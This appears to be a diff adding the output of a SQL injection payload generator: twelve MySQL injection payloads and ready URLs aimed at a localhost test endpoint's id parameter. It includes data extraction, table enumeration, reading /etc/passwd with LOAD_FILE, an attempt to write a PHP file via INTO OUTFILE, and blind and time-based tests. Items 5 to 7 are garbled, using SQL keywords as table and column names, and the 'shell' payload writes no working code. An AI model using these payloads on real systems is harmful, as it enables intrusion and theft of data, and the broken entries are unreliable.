@@ -1,0 +1,70 @@
+
+
+=== SQL INJECTION PAYLOADS for id ===
+Target: http://localhost:8080/test?id=1
+Database Type: mysql
+Generated: 12 payloads
+
+[1] Database Version
+    Description: Extract MySQL version
+    Payload: ' UNION SELECT @@version,2,3--
+    URL: http://localhost:8080/test?id=' UNION SELECT @@version,2,3--
+
+[2] Current Database
+    Description: Extract current database name
+    Payload: ' UNION SELECT database(),2,3--
+    URL: http://localhost:8080/test?id=' UNION SELECT database(),2,3--
+
+[3] Current User
+    Description: Extract current database user
+    Payload: ' UNION SELECT user(),2,3--
+    URL: http://localhost:8080/test?id=' UNION SELECT user(),2,3--
+
+[4] Table Enumeration
+    Description: Extract all table names
+    Payload: ' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+    URL: http://localhost:8080/test?id=' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+
+[5] Data Extraction - WHERE
+    Description: Extract data from WHERE table
+    Payload: ' UNION SELECT WHERE,users,title FROM WHERE--
+    URL: http://localhost:8080/test?id=' UNION SELECT WHERE,users,title FROM WHERE--
+    Columns: WHERE, users, title
+
+[6] Data Extraction - table_schema
+    Description: Extract data from table_schema table
+    Payload: ' UNION SELECT WHERE,table_schema,users FROM table_schema--
+    URL: http://localhost:8080/test?id=' UNION SELECT WHERE,table_schema,users FROM table_schema--
+    Columns: WHERE, table_schema, users
+
+[7] Data Extraction - CONCAT
+    Description: Extract data from CONCAT table
+    Payload: ' UNION SELECT WHERE,CONCAT,users FROM CONCAT--
+    URL: http://localhost:8080/test?id=' UNION SELECT WHERE,CONCAT,users FROM CONCAT--
+    Columns: WHERE, CONCAT, users
+
+[8] File Read (if allowed)
+    Description: Attempt to read system files
+    Payload: ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
+    URL: http://localhost:8080/test?id=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
+
+[9] Shell Command (if allowed)
+    Description: Attempt to write PHP shell
+    Payload: ' UNION SELECT 'shell_exec',2,3 INTO OUTFILE '/tmp/shell.php'--
+    URL: http://localhost:8080/test?id=' UNION SELECT 'shell_exec',2,3 INTO OUTFILE '/tmp/shell.php'--
+
+[10] Blind SQLi - True Condition
+    Description: Test blind SQL injection with true condition
+    Payload: ' AND 1=1--
+    URL: http://localhost:8080/test?id=' AND 1=1--
+
+[11] Blind SQLi - False Condition
+    Description: Test blind SQL injection with false condition
+    Payload: ' AND 1=2--
+    URL: http://localhost:8080/test?id=' AND 1=2--
+
+[12] Time-Based Delay
+    Description: Test time-based SQL injection with 5 second delay
+    Payload: ' AND SLEEP(5)--
+    URL: http://localhost:8080/test?id=' AND SLEEP(5)--
+
